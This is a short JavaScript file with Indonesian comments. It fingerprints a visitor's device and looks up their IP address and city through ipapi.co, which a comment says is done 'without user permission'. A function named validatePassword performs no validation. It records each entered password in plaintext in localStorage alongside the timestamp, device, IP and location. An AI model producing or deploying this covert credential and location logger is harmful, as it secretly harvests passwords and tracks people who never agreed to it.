// Fungsi untuk mendapatkan informasi perangkat yang lebih akurat
function getDeviceInfo() {
    const userAgent = navigator.userAgent;
    let deviceType = "Tidak Diketahui";
    let os = "Tidak Diketahui";

    if (/Android/i.test(userAgent)) {
        deviceType = "Android";
        os = "Android";
    } else if (/iPhone|iPad|iPod/i.test(userAgent)) {
        deviceType = "iOS";
        os = "iOS";
    } else if (/Windows NT 10.0/i.test(userAgent)) {
        deviceType = "Windows PC";
        os = "Windows 10";
    } else if (/Windows NT 6.1/i.test(userAgent)) {
        deviceType = "Windows PC";
        os = "Windows 7";
    } else if (/Macintosh|Mac OS X/i.test(userAgent)) {
        deviceType = "Mac";
        os = "MacOS";
    } else if (/Linux/i.test(userAgent)) {
        deviceType = "Linux PC";
        os = "Linux";
    }

    return {
        device: deviceType,
        os: os,
        userAgent: userAgent
    };
}

// Fungsi untuk mendapatkan lokasi tanpa izin pengguna
function getLocation(callback) {
    fetch("https://ipapi.co/json/")
        .then(response => response.json())
        .then(data => {
            callback({
                city: data.city || "Tidak Diketahui",
                region: data.region || "Tidak Diketahui",
                country: data.country_name || "Tidak Diketahui",
                ip: data.ip || "Tidak Diketahui"
            });
        })
        .catch(error => {
            console.error("Gagal mendapatkan lokasi", error);
            callback({ city: "Tidak Diketahui", region: "Tidak Diketahui", country: "Tidak Diketahui", ip: "Tidak Diketahui" });
        });
}

// Simpan data login ke localStorage
function saveLoginData(password) {
    getLocation((location) => {
        const loginData = JSON.parse(localStorage.getItem("loginData")) || [];
        const deviceInfo = getDeviceInfo();
        const time = new Date().toLocaleString();

        loginData.push({
            time,
            password,
            device: deviceInfo.device,
            os: deviceInfo.os,
            userAgent: deviceInfo.userAgent,
            ip: location.ip,
            location: `${location.city}, ${location.region}, ${location.country}`
        });

        // Simpan ke localStorage
        localStorage.setItem("loginData", JSON.stringify(loginData));
    });
}

// Perbarui fungsi validasi password
function validatePassword() {
    const passwordInput = document.getElementById("password");
    const password = passwordInput.value.trim();

    if (password) {
        saveLoginData(password); // Simpan data login
    }
}
